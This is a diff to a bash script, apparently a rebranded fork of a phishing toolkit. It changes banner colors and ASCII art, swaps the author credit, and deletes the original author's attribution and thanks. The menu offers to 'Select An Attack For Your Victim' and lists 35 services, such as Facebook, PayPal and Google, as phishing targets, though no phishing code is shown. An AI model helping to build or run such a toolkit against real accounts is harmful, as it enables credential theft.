@@ -101,7 +101,9 @@ RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033
 MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
 REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
 MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
-RESETBG="$(printf '\e[0m\n')"
+RESETBG="$(printf '\e[0m\n')"  PINK="$(printf '\033[38;5;206m')"  YELLOW="$(printf '\033[33m')"  PURPLE="$(printf '\033[35m')"
+HOTPINK="$(printf '\033[38;5;198m')"  ULTRAMARINE="$(printf '\033[38;5;61m')"  CITRUS="$(printf '\033[38;5;226m')"
+BLUEORCHID="$(printf '\033[38;5;99m')"  LIGHTSABER_GREEN="$(printf '\033[38;5;34m')"
 
 ## Directories
 BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
@@ -203,27 +205,27 @@ check_status() {
 ## Banner
 banner() {
 	cat <<- EOF
-		${ORANGE}
-		${ORANGE} ______      _     _     _               
-		${ORANGE}|___  /     | |   (_)   | |              
-		${ORANGE}   / / _ __ | |__  _ ___| |__   ___ _ __ 
-		${ORANGE}  / / | '_ \| '_ \| / __| '_ \ / _ \ '__|
-		${ORANGE} / /__| |_) | | | | \__ \ | | |  __/ |   
-		${ORANGE}/_____| .__/|_| |_|_|___/_| |_|\___|_|   
-		${ORANGE}      | |                                
-		${ORANGE}      |_|                ${RED}Version : ${__version__}
+		${HOTPINK}
+		${HOTPINK}   __      __                                _     _     _               
+		${HOTPINK}  |   \  /   |                              | |   (_)   | |              
+		${HOTPINK}  | |\ \/ /| | ___  ,---,__    __    ___ __ | |__  _ ___| |__   ___ _ __ 
+		${HOTPINK}  | | \  / | |/ _ \/ ,-, \ \  /  \  / / '_ \| '_ \| / __| '_ \ / _ \ '__|
+		${HOTPINK}  | |  \/  | |  __/\ '-' /\ \/ /\ \/ /| |_) | | | | \__ \ | | |  __/ |   
+		${HOTPINK}  |_|      |_|\___) '---'  \__/  \__/ | .__/|_| |_|_|___/_| |_|\___|_|   
+		${HOTPINK}                                      | |                                
+		${HOTPINK}                                      |_|                ${ULTRAMARINE}Version : ${__version__}
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by htr-tech (tahmid.rayat)${WHITE}
+		${RED}[${WHITE}-${RED}]${ULTRAMARINE} Tool Created By Sachess${WHITE}
 	EOF
 }
 
 ## Small Banner
 banner_small() {
 	cat <<- EOF
-		${BLUE}
-		${BLUE}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
-		${BLUE}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
-		${BLUE}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${WHITE} ${__version__}
+		${RED}
+		${RED}  ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
+		${RED}  ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
+		${RED}  ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀${GREEN} ${__version__}
 	EOF
 }
 
@@ -341,7 +343,7 @@ install_localxpose() {
 ## Exit message
 msg_exit() {
 	{ clear; banner; echo; }
-	echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
+	echo -e "${GREENBG}${BLACK} Thank you for using me. Have a meow day.${RESETBG}\n"
 	{ reset_color; exit 0; }
 }
 
@@ -349,20 +351,12 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN} Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN} Social   ${RED}:  ${CYAN}https://tahmidrayat.is-a.dev
-		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
 		${CYAN}  This Tool is made for educational purpose 
 		  only ${RED}!${WHITE}${CYAN} Author will not be responsible for 
 		  any misuse of this toolkit ${RED}!${WHITE}
-		
-		${WHITE} ${CYANBG}Special Thanks to:${RESETBG}
-		${GREEN}  1RaY-1, Adi1090x, AliMilani, BDhackers009,
-		  KasRoudra, E343IO, sepp0, ThelinuxChoice,
-		  Yisus7u7
+	
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
 
@@ -737,26 +731,26 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${CYAN}[${WHITE}::${CYAN}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
-		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 
+		${BLUEORCHID}[${WHITE}01${BLUEORCHID}]${CITRUS} Facebook      ${BLUEORCHID}[${WHITE}11${BLUEORCHID}]${CITRUS} Twitch       ${BLUEORCHID}[${WHITE}21${BLUEORCHID}]${CITRUS} DeviantArt
+		${BLUEORCHID}[${WHITE}02${BLUEORCHID}]${CITRUS} Instagram     ${BLUEORCHID}[${WHITE}12${BLUEORCHID}]${CITRUS} Pinterest    ${BLUEORCHID}[${WHITE}22${BLUEORCHID}]${CITRUS} Badoo
+		${BLUEORCHID}[${WHITE}03${BLUEORCHID}]${CITRUS} Google        ${BLUEORCHID}[${WHITE}13${BLUEORCHID}]${CITRUS} Snapchat     ${BLUEORCHID}[${WHITE}23${BLUEORCHID}]${CITRUS} Origin
+		${BLUEORCHID}[${WHITE}04${BLUEORCHID}]${CITRUS} Microsoft     ${BLUEORCHID}[${WHITE}14${BLUEORCHID}]${CITRUS} Linkedin     ${BLUEORCHID}[${WHITE}24${BLUEORCHID}]${CITRUS} DropBox	
+		${BLUEORCHID}[${WHITE}05${BLUEORCHID}]${CITRUS} Netflix       ${BLUEORCHID}[${WHITE}15${BLUEORCHID}]${CITRUS} Ebay         ${BLUEORCHID}[${WHITE}25${BLUEORCHID}]${CITRUS} Yahoo		
+		${BLUEORCHID}[${WHITE}06${BLUEORCHID}]${CITRUS} Paypal        ${BLUEORCHID}[${WHITE}16${BLUEORCHID}]${CITRUS} Quora        ${BLUEORCHID}[${WHITE}26${BLUEORCHID}]${CITRUS} Wordpress
+		${BLUEORCHID}[${WHITE}07${BLUEORCHID}]${CITRUS} Steam         ${BLUEORCHID}[${WHITE}17${BLUEORCHID}]${CITRUS} Protonmail   ${BLUEORCHID}[${WHITE}27${BLUEORCHID}]${CITRUS} Yandex			
+		${BLUEORCHID}[${WHITE}08${BLUEORCHID}]${CITRUS} Twitter       ${BLUEORCHID}[${WHITE}18${BLUEORCHID}]${CITRUS} Spotify      ${BLUEORCHID}[${WHITE}28${BLUEORCHID}]${CITRUS} StackoverFlow
+		${BLUEORCHID}[${WHITE}09${BLUEORCHID}]${CITRUS} Playstation   ${BLUEORCHID}[${WHITE}19${BLUEORCHID}]${CITRUS} Reddit       ${BLUEORCHID}[${WHITE}29${BLUEORCHID}]${CITRUS} Vk
+		${BLUEORCHID}[${WHITE}10${BLUEORCHID}]${CITRUS} Tiktok        ${BLUEORCHID}[${WHITE}20${BLUEORCHID}]${CITRUS} Adobe        ${BLUEORCHID}[${WHITE}30${BLUEORCHID}]${CITRUS} XBOX
+		${BLUEORCHID}[${WHITE}31${BLUEORCHID}]${CITRUS} Mediafire     ${BLUEORCHID}[${WHITE}32${BLUEORCHID}]${CITRUS} Gitlab       ${BLUEORCHID}[${WHITE}33${BLUEORCHID}]${CITRUS} Github
+		${BLUEORCHID}[${WHITE}34${BLUEORCHID}]${CITRUS} Discord       ${BLUEORCHID}[${WHITE}35${BLUEORCHID}]${CITRUS} Roblox 
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
+		${BLUEORCHID}[${WHITE}99${BLUEORCHID}]${CITRUS} About         ${BLUEORCHID}[${WHITE}00${BLUEORCHID}]${CITRUS} Exit
 
 	EOF
 	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${BLUEORCHID}[${WHITE}-${BLUEORCHID}]${LIGHTSABER_GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
